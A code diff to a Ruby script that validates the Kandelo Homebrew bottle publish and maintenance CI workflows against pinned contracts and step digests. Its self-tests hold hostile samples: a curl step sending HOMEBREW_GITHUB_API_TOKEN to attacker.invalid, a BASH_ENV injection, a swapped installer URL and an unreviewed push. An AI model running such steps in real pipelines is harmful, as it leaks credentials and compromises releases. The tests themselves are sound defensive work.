@@ -2,6 +2,7 @@
 # frozen_string_literal: true
 
 require "digest"
+require "json"
 require "yaml"
 
 REPO_ROOT = File.expand_path("..", __dir__)
@@ -39,6 +40,23 @@ end
 
 def deep_copy(value)
   Marshal.load(Marshal.dump(value))
+end
+
+def canonical_contract(value)
+  case value
+  when Hash
+    value.keys.sort_by(&:to_s).to_h do |key|
+      [key.to_s, canonical_contract(value.fetch(key))]
+    end
+  when Array
+    value.map { |entry| canonical_contract(entry) }
+  else
+    value
+  end
+end
+
+def step_contract_digest(steps)
+  Digest::SHA256.hexdigest(JSON.generate(canonical_contract(steps)))
 end
 
 def expect_rejection(label)
@@ -95,8 +113,43 @@ def check_common(workflow, label)
 end
 
 def check_publisher(workflow)
+  top_level_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
+  check(top_level_keys == %w[concurrency jobs name on],
+        "publisher has unexpected top-level configuration")
+  check(workflow["name"] == "Reusable Kandelo Homebrew bottle publish",
+        "publisher name changed")
+  expected_concurrency = {
+    "group" => "kandelo-homebrew-bottle-publish-${{ inputs.tap-repository }}-" \
+               "${{ inputs.release-tag || github.run_id }}",
+    "cancel-in-progress" => false,
+  }
+  check(workflow["concurrency"] == expected_concurrency,
+        "publisher concurrency contract changed")
+
   events = workflow_events(workflow)
   check(events.keys == ["workflow_call"], "publisher must only expose workflow_call")
+  workflow_call = events.fetch("workflow_call")
+  check(workflow_call.keys == ["inputs"], "publisher workflow_call contract changed")
+  expected_inputs = {
+    "kandelo-repository" => { "type" => "string", "default" => "Automattic/kandelo" },
+    "kandelo-ref" => { "type" => "string", "default" => "main" },
+    "tap-repository" => { "type" => "string", "default" => "Automattic/kandelo-homebrew" },
+    "tap-ref" => { "type" => "string", "default" => "main" },
+    "formulae" => { "type" => "string", "required" => true },
+    "arches" => { "type" => "string", "default" => "wasm32" },
+    "release-tag" => { "type" => "string", "default" => "" },
+    "bottle-root-url" => { "type" => "string", "default" => "" },
+    "sidecar-command" => {
+      "type" => "string",
+      "default" => "bash scripts/homebrew-generate-sidecars-from-env.sh",
+    },
+    "expected-cache-keys" => { "type" => "string", "default" => "" },
+    "force" => { "type" => "boolean", "default" => false },
+    "repair-only" => { "type" => "boolean", "default" => false },
+    "dry-run" => { "type" => "boolean", "default" => false },
+  }
+  check(workflow_call["inputs"] == expected_inputs, "publisher inputs changed")
+
   jobs = workflow_jobs(workflow)
   check(jobs.keys.sort == %w[build-and-publish plan], "publisher has an unexpected job set")
   check(jobs.fetch("plan").keys.sort == %w[outputs runs-on steps],
@@ -112,6 +165,9 @@ def check_publisher(workflow)
   check_common(workflow, "reusable publisher")
 
   plan_steps = job_steps(jobs.fetch("plan"), "publisher plan")
+  check(step_contract_digest(plan_steps) ==
+        "7602b0626e66888f9e26ace944244608d77d01c2cdcf1f960eb21b5555f72119",
+        "publisher plan step contract changed")
   validation_index = plan_steps.index { |step| step["name"] == "Validate caller trust boundary" }
   checkout_indices = plan_steps.each_index.select do |index|
     plan_steps[index]["uses"].to_s.downcase.start_with?("actions/checkout@")
@@ -219,6 +275,10 @@ def check_publisher(workflow)
   }
   check(build["strategy"] == expected_strategy,
         "publisher build strategy bypasses the validated plan output")
+  build_steps = job_steps(build, "publisher build")
+  check(step_contract_digest(build_steps) ==
+        "23990a135f89246de344363ba915cb427d0afce02a29b1db7011b2f064f924c8",
+        "publisher build step contract changed")
 
   plan_checkouts = plan_steps.select do |step|
     step["uses"].to_s.downcase.start_with?("actions/checkout@")
@@ -254,7 +314,7 @@ def check_publisher(workflow)
           "c05aa8d02adf2380b8acf8dcb3a7e27341660cefe7600bb8d944daf384d83248",
         "publisher source-commit resolution changed")
 
-  build_checkouts = job_steps(build, "publisher build").select do |step|
+  build_checkouts = build_steps.select do |step|
     step["uses"].to_s.downcase.start_with?("actions/checkout@")
   end.map { |step| { "name" => step["name"], "with" => step["with"] } }
   expected_build_checkouts = [
@@ -280,13 +340,36 @@ def check_publisher(workflow)
 end
 
 def check_maintenance(workflow)
+  top_level_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
+  check(top_level_keys == %w[concurrency jobs name on],
+        "maintenance has unexpected top-level configuration")
+  check(workflow["name"] == "Reusable Kandelo Homebrew bottle maintenance",
+        "maintenance name changed")
+  expected_concurrency = {
+    "group" => "kandelo-homebrew-bottle-maintenance-Automattic-kandelo-homebrew-" \
+               "${{ inputs.release-tag || github.run_id }}",
+    "cancel-in-progress" => false,
+  }
+  check(workflow["concurrency"] == expected_concurrency,
+        "maintenance concurrency contract changed")
+
   events = workflow_events(workflow)
   check(events.keys == ["workflow_call"], "maintenance must only expose workflow_call")
-  inputs = events.fetch("workflow_call").fetch("inputs")
-  forbidden_inputs = %w[
-    kandelo-repository kandelo-ref tap-repository tap-ref bottle-root-url sidecar-command dry-run
-  ]
-  check((inputs.keys & forbidden_inputs).empty?, "maintenance exposes executable refs or commands")
+  workflow_call = events.fetch("workflow_call")
+  check(workflow_call.keys == ["inputs"], "maintenance workflow_call contract changed")
+  expected_inputs = {
+    "mode" => { "type" => "string", "default" => "rebuild" },
+    "formulae" => { "type" => "string", "required" => true },
+    "arches" => { "type" => "string", "default" => "wasm32" },
+    "release-tag" => { "type" => "string", "default" => "" },
+    "expected-cache-keys" => { "type" => "string", "default" => "" },
+    "force" => { "type" => "boolean", "default" => false },
+    "rollback-reason" => { "type" => "string", "default" => "" },
+    "rollback-ref" => { "type" => "string", "default" => "" },
+    "deleted-package-url" => { "type" => "string", "default" => "" },
+    "deletion-reason" => { "type" => "string", "default" => "" },
+  }
+  check(workflow_call["inputs"] == expected_inputs, "maintenance inputs changed")
   check_common(workflow, "maintenance workflow")
 
   jobs = workflow_jobs(workflow)
@@ -309,12 +392,21 @@ def check_maintenance(workflow)
         "maintenance rebuild permissions are not exact")
   check(rebuild["uses"] == "./.github/workflows/reusable-homebrew-bottle-publish.yml",
         "maintenance rebuild does not call the reviewed publisher")
-  rebuild_with = rebuild.fetch("with")
-  check(rebuild_with["kandelo-repository"] == "Automattic/kandelo" &&
-        rebuild_with["kandelo-ref"] == "main" &&
-        rebuild_with["tap-repository"] == "Automattic/kandelo-homebrew" &&
-        rebuild_with["tap-ref"] == "main", "maintenance rebuild does not use first-party main refs")
-  check(rebuild_with["dry-run"] == false, "maintenance rebuild exposes a write-scoped dry run")
+  expected_rebuild_with = {
+    "kandelo-repository" => "Automattic/kandelo",
+    "kandelo-ref" => "main",
+    "tap-repository" => "Automattic/kandelo-homebrew",
+    "tap-ref" => "main",
+    "formulae" => "${{ inputs.formulae }}",
+    "arches" => "${{ inputs.arches }}",
+    "release-tag" => "${{ inputs.release-tag }}",
+    "expected-cache-keys" => "${{ inputs.expected-cache-keys }}",
+    "force" => "${{ inputs.force }}",
+    "repair-only" => "${{ inputs.mode == 'repair-only' }}",
+    "dry-run" => false,
+  }
+  check(rebuild.fetch("with") == expected_rebuild_with,
+        "maintenance rebuild input wiring changed")
 
   rollback = jobs.fetch("rollback")
   check(rollback.keys.sort == %w[if permissions runs-on steps timeout-minutes] &&
@@ -326,6 +418,9 @@ def check_maintenance(workflow)
   check(exact_permissions?(rollback["permissions"], expected_rollback_permissions),
         "maintenance rollback permissions are not exact")
   rollback_steps = job_steps(rollback, "maintenance rollback")
+  check(step_contract_digest(rollback_steps) ==
+        "7af666d90021b9b9b913bfe4810368d559062bfcabd09c7d880459b022ff3f42",
+        "maintenance rollback step contract changed")
   checkout_steps = rollback_steps.select do |step|
     next unless step["uses"].to_s.downcase.start_with?("actions/checkout@")
     step
@@ -426,6 +521,24 @@ def self_test(publisher, maintenance)
   expect_rejection("an extra publisher job") do
     mutated = deep_copy(publisher)
     mutated.fetch("jobs")["backdoor"] = { "uses" => "owner/repo/.github/workflows/write.yml@main" }
+    check_publisher(mutated)
+  end
+  expect_rejection("publisher top-level environment injection") do
+    mutated = deep_copy(publisher)
+    mutated["env"] = { "BASH_ENV" => "/tmp/backdoor" }
+    check_publisher(mutated)
+  end
+  expect_rejection("publisher concurrency cancellation") do
+    mutated = deep_copy(publisher)
+    mutated.fetch("concurrency")["cancel-in-progress"] = true
+    check_publisher(mutated)
+  end
+  expect_rejection("an extra publisher input") do
+    mutated = deep_copy(publisher)
+    workflow_events(mutated).fetch("workflow_call").fetch("inputs")["command"] = {
+      "type" => "string",
+      "default" => "true",
+    }
     check_publisher(mutated)
   end
   expect_rejection("direct publisher dispatch") do
@@ -540,6 +653,15 @@ def self_test(publisher, maintenance)
     }
     check_publisher(mutated)
   end
+  expect_rejection("a static publisher token-exfiltration step") do
+    mutated = deep_copy(publisher)
+    mutated.dig("jobs", "build-and-publish", "steps") << {
+      "name" => "Exfiltrate publisher token",
+      "shell" => "bash",
+      "run" => "curl -d \"$HOMEBREW_GITHUB_API_TOKEN\" https://attacker.invalid",
+    }
+    check_publisher(mutated)
+  end
   expect_rejection("missing first-party repository validation") do
     mutated = deep_copy(publisher)
     step = mutated.dig("jobs", "plan", "steps").find do |candidate|
@@ -562,6 +684,19 @@ def self_test(publisher, maintenance)
     }
     check_maintenance(mutated)
   end
+  expect_rejection("maintenance top-level environment injection") do
+    mutated = deep_copy(maintenance)
+    mutated["env"] = { "BASH_ENV" => "/tmp/backdoor" }
+    check_maintenance(mutated)
+  end
+  expect_rejection("an extra maintenance input") do
+    mutated = deep_copy(maintenance)
+    workflow_events(mutated).fetch("workflow_call").fetch("inputs")["tap-ref"] = {
+      "type" => "string",
+      "default" => "main",
+    }
+    check_maintenance(mutated)
+  end
   expect_rejection("a self-hosted rollback") do
     mutated = deep_copy(maintenance)
     mutated.dig("jobs", "rollback")["runs-on"] = "self-hosted"
@@ -573,6 +708,15 @@ def self_test(publisher, maintenance)
       candidate["uses"].to_s.start_with?("DeterminateSystems/nix-installer-action@")
     end
     step.fetch("with")["source-url"] = "https://attacker.invalid/nix-installer"
+    check_maintenance(mutated)
+  end
+  expect_rejection("a static maintenance push step") do
+    mutated = deep_copy(maintenance)
+    mutated.dig("jobs", "rollback", "steps") << {
+      "name" => "Push unreviewed rollback",
+      "shell" => "bash",
+      "run" => "git -C tap push origin HEAD:main",
+    }
     check_maintenance(mutated)
   end
   expect_rejection("removed rollback identifier validation") do
